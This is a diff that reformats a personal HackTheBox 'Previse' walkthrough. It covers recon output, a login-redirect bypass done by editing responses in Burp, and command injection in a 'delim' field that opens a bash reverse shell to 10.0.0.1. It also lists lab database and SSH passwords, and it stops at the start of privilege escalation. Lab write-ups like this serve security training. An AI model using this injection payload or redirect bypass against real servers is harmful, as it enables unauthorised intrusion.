@@ -1,20 +1,20 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Previse
-# 29/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Linux |
+| Difficulty | Easy |
+
 10.10.11.104
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 
-----------------------------------------------------
 # gobuster
-----------------------------------------------------
 /.php                 (Status: 403) [Size: 277]
 /download.php         (Status: 302) [Size: 0] [--> login.php]
 /index.php            (Status: 302) [Size: 2801] [--> login.php]
@@ -31,9 +31,7 @@ PORT   STATE SERVICE VERSION
 /config.php           (Status: 200) [Size: 0]
 /logs.php             (Status: 302) [Size: 0] [--> login.php]
 
-----------------------------------------------------
 # initial
-----------------------------------------------------
 http://10.10.11.104/nav.php
 When clicking on create account we are redirected back to the login page. Testing for faulty redirects I
 captured the request in BurpSuite and sent the GET request to the repeater tab. After processing a GET
@@ -43,8 +41,6 @@ http://10.10.11.104/accounts.php
 intercept response of request and change to 200 Ok
 we get acc creation page
  create ann ac
-
-
 
 
  POST /accounts.php HTTP/1.1
@@ -64,12 +60,10 @@ Upgrade-Insecure-Requests: 1
 username=testuser&password=password123&confirm=password123&submit=
 
 
-
 user created succes
 
 
 login
-
 
 
 intercept http://10.10.11.104/file_logs.php  and sumbit
@@ -81,9 +75,7 @@ delim=comma;bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
 url endcode and sennd we got a shell
 
 
-----------------------------------------------------
 # lateral movemennt
-----------------------------------------------------
 cat config.php
     $user = 'root';
     $passwd = 'mySQL_p@ssw0rd!:)';
@@ -100,9 +92,7 @@ cat config.php
 oxdf@parrot$ sshpass -p 'ilovecody112235!' ssh m4lwhere@10.10.11.104
 
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 m4lwhere@previse:~$ sudo -l
 
 m4lwhere@previse:/tmp$ 
